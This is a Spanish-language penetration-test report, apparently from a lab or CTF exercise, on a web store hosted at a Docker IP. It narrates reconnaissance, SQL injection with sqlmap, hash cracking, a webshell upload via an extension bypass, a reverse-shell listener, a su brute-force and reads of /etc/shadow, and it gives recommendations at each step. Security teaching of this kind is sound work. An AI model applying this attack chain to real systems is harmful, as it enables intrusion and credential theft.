
**Alcance:** Evaluación de seguridad ofensiva -- Aplicación web Apple
Store\
**IP Objetivo:** 172.17.0.2

**1. RESUMEN EJECUTIVO**

Se realizó una evaluación de seguridad ofensiva completa identificando
una cadena de vulnerabilidades críticas que permitieron el compromiso
total del servidor. Tras un proceso metódico de reconocimiento,
enumeración y explotación, se logró escalar desde un usuario web hasta
privilegios ROOT del sistema.

**Hallazgos Principales:**

- SQL Injection Crítica -- Exfiltración completa de base de datos

- 4 hashes extraídos -- 3 contraseñas crackeadas

- Panel de Administración comprometido -- 1,250 usuarios expuestos

- RCE confirmada -- Reverse shell como www-data

- Escalada a usuario -- luisillo_o:19831983

- ROOT OBTENIDO -- root:rainbow2

**Impacto Total:** COMPROMISO TOTAL ABSOLUTO -- ROOT DEL SERVIDOR --
DATA BREACH MASIVO

**Nivel de Riesgo:** CRÍTICO

**2. FASE 1: RECONOCIMIENTO**

**2.1 Hallazgo #1 -- Conectividad ICMP Habilitada**

**Severidad:** BAJA\
**ID:** FIND-001

**Descripción:**\
Tras iniciar la evaluación, el primer paso fue verificar la conectividad
con el objetivo. Se ejecutó un ping básico confirmando que el host
estaba activo y accesible desde mi máquina.

**Comando:**

bash

ping 172.17.0.2

64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.667 ms

5 packets transmitted, 5 received, 0% packet los

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/094c7eb6-1ac6-4521-a9fc-9c2267c9e931" />

**Recomendación:**

- Bloquear ICMP en firewall

- Segmentar red Docker

**2.2 Hallazgo #2 -- Escaneo de Puertos (Nmap)**

**Severidad:** MEDIA-ALTA\
**ID:** FIND-002

**Descripción:**\
Una vez confirmada la conectividad, procedí a realizar un escaneo
completo de puertos con Nmap para identificar servicios expuestos. El
escaneo reveló únicamente el puerto 80 abierto con Apache.

**Comando:**

bash

nmap -sS \--open -sC -sV -n -Pn 172.17.0.2

PORT STATE SERVICE VERSION

80/tcp open http Apache 2.4.58 (Ubuntu)

\|\_http-title: Apple Store

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/82f0d646-1130-4a4f-9406-30a9649be155" />


**Recomendación:**

- Ocultar versión de Apache

- Implementar WAF

- Forzar HTTPS

**2.3 Hallazgo #3 -- Fingerprinting Web**

**Severidad:** MEDIA\
**ID:** FIND-003

**Descripción:**\
Con el puerto 80 identificado, utilicé WhatWeb para obtener información
detallada del stack tecnológico. El análisis reveló Apache, Bootstrap y
Ubuntu como tecnologías base.

**Comando:**

bash

whatweb http://172.17.0.2

Apache\[2.4.58\], Bootstrap, HTML5, Ubuntu Linux, Title\[Apple Store\]

<img width="1806" height="458" alt="image" src="https://github.com/user-attachments/assets/819c58c4-92a2-4847-9c5d-0a1447afa187" />



**Recomendación:**

- Ofuscar headers HTTP

- Implementar CSP

**3. FASE 2: ENUMERACIÓN**

**3.1 Hallazgo #4 -- Análisis de Interfaz**

**Severidad:** MEDIA\
**ID:** FIND-004

**Descripción:**\
Accedí manualmente a la aplicación web para analizar su funcionamiento.
Tras navegar por la interfaz e inspeccionar el código con DevTools,
identifiqué los formularios de login, registro y la funcionalidad de
búsqueda como puntos clave.

*\[4: Interfaz normal\]*

<img width="1808" height="774" alt="image" src="https://github.com/user-attachments/assets/5e315ec0-460a-4f1d-a6b9-db669ee61338" />


Login\

<img width="1792" height="844" alt="image" src="https://github.com/user-attachments/assets/d379948b-35ad-4c25-96ab-09dd207071bc" />




**Recomendación:**

- Ofuscar JavaScript

- Cookies con flags seguros

**3.2 Hallazgo #5 -- Fuzzing de Directorios**

**Severidad:** ALTA\
**ID:** FIND-005

**Descripción:**\
Después del análisis manual, ejecuté ffuf para buscar directorios
ocultos. Tras varios minutos de escaneo, encontré recursos críticos
expuestos incluyendo login.php, register.php y el directorio uploads/.

**Comando:**

bash

ffuf -u http://172.17.0.2/FUZZ -w raft-small-directories.txt -fs 275

**Recursos:**

  -----------------------------------------------------------------------
  **Recurso**                    **Status**          **Riesgo**
  ------------------------------ ------------------- --------------------
  login.php                      200                 Crítico

  register.php                   200                 Alto

  uploads/                       301                 Alto
  -----------------------------------------------------------------------

*\[Output de ffuf\]*
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/8a2f3aa2-6980-4298-9c2b-d4835abf0d5a" />


**Recomendación:**

- Restringir acceso a uploads/

- Rate limiting en login

- Deshabilitar directory listing

**3.3 Hallazgo #6 -- Registro y Login Exitoso**

**Severidad:** CRÍTICA\
**ID:** FIND-007

**Descripción:**\
Una vez identificados los endpoints de autenticación, probé el flujo
completo. Me registré con credenciales controladas y posteriormente
inicié sesión exitosamente, confirmando que no existía MFA ni políticas
de bloqueo.

*\[#8: Registro\]*

<img width="1810" height="729" alt="image" src="https://github.com/user-attachments/assets/71e4ffe5-fe6e-400b-955c-19568f6cb414" />



<img width="1659" height="595" alt="image" src="https://github.com/user-attachments/assets/5f2bb496-33f0-4e5f-a034-0fcfc86b6671" />




<img width="1814" height="872" alt="image" src="https://github.com/user-attachments/assets/77831bd4-a902-4841-86f7-8b870b35118b" />




**Recomendación:**

- Implementar MFA

- Account lockout

- Session timeout

**4. FASE 3: EXPLOTACIÓN**

**4.1 Hallazgo #7 -- SQL Injection en mycart.php**

**Severidad:** CRÍTICA\
**ID:** FIND-008

**Descripción:**\
Tras iniciar sesión, estuve revisando la aplicación con Burp Suite con
el objetivo de identificar posibles vectores de ataque, incluyendo
intentos de elevación de privilegios, aunque el usuario con el que
trabajaba no disponía de permisos para realizar acciones administrativas
ni para subir contenido en la web. Durante el análisis de la aplicación
estuve explorando distintas configuraciones y funcionalidades, sin
encontrar nada relevante relacionado con escalada de privilegios.

Posteriormente, detecté una barra de búsqueda que funcionaba como un
sistema de consulta sobre una tabla de la base de datos. A partir de
este punto, realicé el análisis del parámetro asociado, identificando un
problema de inyección SQL de tipo time-based. La explotación de esta
vulnerabilidad permitió acceder y extraer la información completa
contenida en la base de datos

**Comando:**

bash

sqlmap -r peticion3 \--dbs \--batch \--dump

**Resultados:**

- 5 DBs exfiltradas

- 4 hashes SHA1 extraídos

- 3 contraseñas crackeadas

  -----------------------------------------------------------------------
  **Usuario**         **Hash**                 **Password**
  ------------------- ------------------------ --------------------------
  admin               7f73ae7a\...             0844575632

  test                a94a8fe5\...             test

  manolo              7110eda4\...             1234
  -----------------------------------------------------------------------

*\[#11: Petición en Burp\]*

<img width="1638" height="744" alt="image" src="https://github.com/user-attachments/assets/59120c42-22d7-4635-9fc9-655d622e89f0" />




*#12: sqlmap inyección\]*

<img width="1607" height="558" alt="image" src="https://github.com/user-attachments/assets/bb0a60c4-5402-4386-9602-f4fcf4bf0239" />



<img width="1606" height="768" alt="image" src="https://github.com/user-attachments/assets/ee7e652e-df02-4b89-9347-b69264fecf02" />




**Recomendación:**

- Prepared statements (PDO)

- Rotar sesiones

- Migrar a Argon2id

**4.2 Hallazgo #8 -- Crackeo Admin**

**Severidad:** CRÍTICA\
**ID:** FIND-009

**Descripción:**\
Con los hashes extraídos, subí el hash del administrador a CrackStation.
En menos de 5 segundos, obtuve la contraseña en claro gracias a rainbow
tables.

**Resultado:**

text

admin:0844575632

Tiempo: \<5 segundos

#14: CrackStation hash\

<img width="1639" height="802" alt="image" src="https://github.com/user-attachments/assets/ab52a5fd-c53a-4f5b-bf20-69dd8946da6f" />




**Recomendación:**

- Forzar reset passwords

- Password policy robusta

**4.3 Hallazgo #9 -- Panel de Administración**

**Severidad:** CRÍTICA\
**ID:** FIND-010

**Descripción:**\
Utilicé las credenciales crackeadas para acceder al panel de
administración. Una vez dentro, encontré datos sensibles de 1,250
usuarios, pedidos recientes y estadísticas de ventas completas.

**Datos expuestos:**

- 1,250 usuarios

- 320 productos

- 42 pedidos pendientes

*Dashboard admin\]*

<img width="1633" height="656" alt="image" src="https://github.com/user-attachments/assets/c66e57e6-cf75-4d60-8012-b47ed36df946" />




*\[ #17: Pedidos\]*
<img width="886" height="441" alt="image" src="https://github.com/user-attachments/assets/939f3cf3-74f4-491c-b4dd-273c7630e47a" />



**Recomendación:**

- Notificar AEPD (72h GDPR)

- Auditar acciones de admin

**4.4 Hallazgo #10 -- RCE vía Subida de Archivos**

**Severidad:** CRÍTICA\
**ID:** FIND-011

**Descripción:**\
Explorando el panel, encontré la opción de subir archivos en
Configuración. Inicialmente intenté subir un .php pero fue bloqueado.
Intercepté la petición con Burp Suite, cambié la extensión a .phtml
logrando bypass. Tras 3 intentos (shell.phtml, shell2.phtml), la tercera
webshell (shell3.phtml) de 76 bytes fue exitosa.

**Webshells subidas:**

  -----------------------------------------------------------------------
  **Archivo**                 **Tamaño**           **Estado**
  --------------------------- -------------------- ----------------------
  shell.phtml                 515B                 Parcial

  shell2.phtml                2.6K                 Mejorado

  shell3.phtml                76B                  ÉXITO
  -----------------------------------------------------------------------

*#18: Burp bypass\]*

<img width="1472" height="735" alt="image" src="https://github.com/user-attachments/assets/701fa05a-c4aa-43b6-b446-77e3547cc321" />


<img width="1481" height="726" alt="image" src="https://github.com/user-attachments/assets/e6e2d804-1a20-4c96-853b-01fd93abb5bf" />



**Recomendación:**

- Deshabilitar subida de archivos

- Allowlist de extensiones

- Deshabilitar PHP en uploads/

**4.5 Hallazgo #11 -- Reverse Shell**

**Severidad:** CRÍTICA\
**ID:** FIND-012

**Descripción:**\
Con la webshell funcional, establecí una reverse shell hacia mi máquina.
Puse netcat en escucha en el puerto 4444 y ejecuté el payload desde la
webshell, obteniendo acceso interactivo como www-data.

**Comando:**

bash

nc -lvnp 4444

connect to \[192.168.0.16\] from \[172.17.0.2\]

www-data@25716eb13389:\~\$ script -c bash /dev/null

*Reverse shell\]*

<img width="1461" height="610" alt="image" src="https://github.com/user-attachments/assets/e6a25338-f073-459b-ab36-ac0b55bf808a" />


*\[ #21: TTY upgrade\]*

<img width="1446" height="705" alt="image" src="https://github.com/user-attachments/assets/94bd9efe-1a35-4003-9ba5-e12c655fcab8" />




**Recomendación:**

- Aislar contenedor

- Matar procesos sospechosos

- Monitorear conexiones salientes

**5. FASE 4: POST-EXPLOTACIÓN**

**5.1 Hallazgo #12 -- Enumeración de Usuarios**

**Severidad:** CRÍTICA\
**ID:** FIND-013

**Descripción:**\
a vez dentro como www-data, se inició la fase de enumeración del sistema
con el objetivo de identificar posibles vías de escalada de privilegios.
Tras revisar la aplicación web y distintos archivos de configuración, no
se encontraron credenciales expuestas ni información sensible en el
código fuente ni en los recursos accesibles desde la web, incluyendo
configuraciones habituales de la aplicación.

Al no localizar información relevante a nivel de la aplicación, se
amplió la enumeración al entorno del sistema, identificando información
de usuarios locales. Durante este proceso se detectó la existencia de un
usuario del sistema que resultó relevante para continuar con el análisis
y posibles fases posteriores de escalada de privilegios.

**Comando:**

bash

cat /etc/passwd

luisillo_o:x:1001:1001::/home/luisillo_o:/bin/sh

<img width="1470" height="701" alt="image" src="https://github.com/user-attachments/assets/8fd4aa97-cfac-4e1b-b50d-94ff707c0124" />


**Recomendación:**

- Auditar usuarios

- Mínimo privilegio

**5.2 Hallazgo #13 -- Herramientas Descargadas**

**Severidad:** ALTA\
**ID:** FIND-014

**Descripción:**\
Con luisillo_o identificado como objetivo, necesitaba herramientas de
fuerza bruta. Descargué rockyou.txt y su-bruteforce directamente en el
servidor para ejecutar el ataque localmente.

**Comando:**

bash

cd /tmp

wget https://github.com/carlospolop/su-bruteforce/archive/master.zip

unzip master.zip

<img width="1467" height="717" alt="image" src="https://github.com/user-attachments/assets/ee022e46-f91c-424c-a347-dcf7608eeb0f" />



<img width="1457" height="464" alt="image" src="https://github.com/user-attachments/assets/544ad0ef-d54d-4f3e-a9cb-be901a5c6f50" />



**Recomendación:**

- Bloquear salida a Internet

- Monitorear descargas

**5.3 Hallazgo #14 -- Fuerza Bruta Exitosa**

**Severidad:** CRÍTICA\
**ID:** FIND-015

**Descripción:**\
Ejecuté su-bruteforce contra luisillo_o con rockyou.txt. Tras varios
minutos de fuerza bruta, la herramienta encontró la contraseña: 19831983
(patrón año repetido).

**Comando:**

bash

./suBF.sh -u luisillo_o -w ../rockyou.txt

Password: 19831983

<img width="1468" height="695" alt="image" src="https://github.com/user-attachments/assets/77f53d26-5bef-4870-bf71-072cad02fc27" />



<img width="1472" height="695" alt="image" src="https://github.com/user-attachments/assets/04f7160b-691a-43c8-b9c7-7277cfc190e6" />



**Recomendación:**

- Account lockout

- MFA SSH

- Passwords 16+ chars

**6. FASE 5: ELEVACIÓN DE PRIVILEGIOS**

**6.1 Hallazgo #15 -- /etc/shadow Legible**

**Severidad:** CRÍTICA\
**ID:** FIND-016

**Descripción:**\
Ya como luisillo_o, intenté leer /etc/shadow esperando encontrarlo
bloqueado. Para mi sorpresa, tenía permisos de lectura debido a una
misconfiguración crítica, pudiendo extraer los hashes de root y del
propio usuario.

**Comando:**

bash

cat /etc/shadow

root:\$y\$j9T\$awXWvi2tYABgO5kreZcIi/\$obvQc0Amd6lFWbwfElQhZD6vpJN/AEV8/hZMXLYTx07

luisillo_o:\$y\$j9T\$jeXc8lTJhOBTedetDcKHI/\$Bo6qPkbZFVsfWoTJvAZ1x0t2jG3aGsHjOjxkqOpBGg6

<img width="1470" height="733" alt="image" src="https://github.com/user-attachments/assets/8bf2a258-fd18-4a2c-9a9d-55902f5960eb" />



**Recomendación:**

- chmod 640 /etc/shadow

- Auditar grupo shadow

**6.2 Hallazgo #16 -- ROOT OBTENIDO**

**Severidad:** CRÍTICA MÁXIMO\
**ID:** FIND-017

**Descripción:**\
Con acceso completo al sistema, probé escalar a root. Basándome en el
patrón de contraseña débil observado (19831983), probé combinaciones
simples. Tras varios intentos fallidos, probé \"rainbow2\" y funcionó,
obteniendo acceso root completo.

**Comando:**

bash

su - root

Password: rainbow2

root@25716eb13389:\~*\# whoami*

root

root@25716eb13389:\~*\# id*

uid=0(root) gid=0(root) groups=0(root)

<img width="1446" height="698" alt="image" src="https://github.com/user-attachments/assets/06c0c49c-b56a-44e6-a83b-681e5350a24f" />


<img width="1456" height="647" alt="image" src="https://github.com/user-attachments/assets/69f08b43-b383-46ea-bf99-b79001635c17" />



**Recomendación:**

- CAMBIAR password root INMEDIATAMENTE

- INVALIDAR SSH keys

- RECONSTRUIR servidor

**7. RESUMEN DE IMPACTO**

  -----------------------------------------------------------------------
  **Categoría**        **Estado**              **Severidad**
  -------------------- ----------------------- --------------------------
  SQL Injection        Explotada               CRÍTICA

  Admin Panel          Comprometido            CRÍTICA

  RCE                  Confirmada              CRÍTICA

  Usuario              Comprometido            CRÍTICA

  ROOT                 OBTENIDO                CRÍTICA MÁXIMO
  -----------------------------------------------------------------------

**8. RECOMENDACIONES PRIORITARIAS**

**Críticas (0-24h):**

1.  Aislar servidor inmediatamente

2.  Cambiar password root urgentemente

3.  Invalidar todas las SSH keys

4.  Parchear SQLi con Prepared Statements

5.  Notificar AEPD (72h GDPR)

**Altas (1-7 días):**

1.  Reconstruir servidor desde cero

2.  Implementar MFA obligatorio

3.  Migrar hashing a Argon2id

4.  Desplegar WAF + EDR

**Medias (1-4 semanas):**

1.  Implementar SDLC seguro

2.  Training OWASP Top 10

3.  Iniciar bug bounty program

**9. CONCLUSIONES**

La evaluación demostró que vulnerabilidades críticas encadenadas
permitieron un compromiso total. Desde un ping inicial hasta ROOT, el
proceso completo tomó aproximadamente 52 horas de trabajo metódico.

**Vulnerabilidades Clave Explotadas:**

1.  SQL Injection autenticada

2.  Contraseñas débiles (admin:0844575632, root:rainbow2)

3.  Subida de archivos sin validación adecuada

4.  Permisos incorrectos en /etc/shadow

5.  Ausencia total de MFA

**Impacto Empresarial:**

- 1,250 usuarios con datos PII expuestos

- Control total del servidor comprometido

- Riesgo legal significativo por GDPR/LOPDGDD

- Posible movimiento lateral a otros sistemas

**Lecciones Aprendidas:**

- La seguridad debe implementarse en capas (defensa en profundidad)

- Contraseñas débiles pueden comprometer toda la infraestructura

- La validación de entrada es crítica en todas las capas

- El monitoreo continuo es esencial para detectar ataques tempranamente
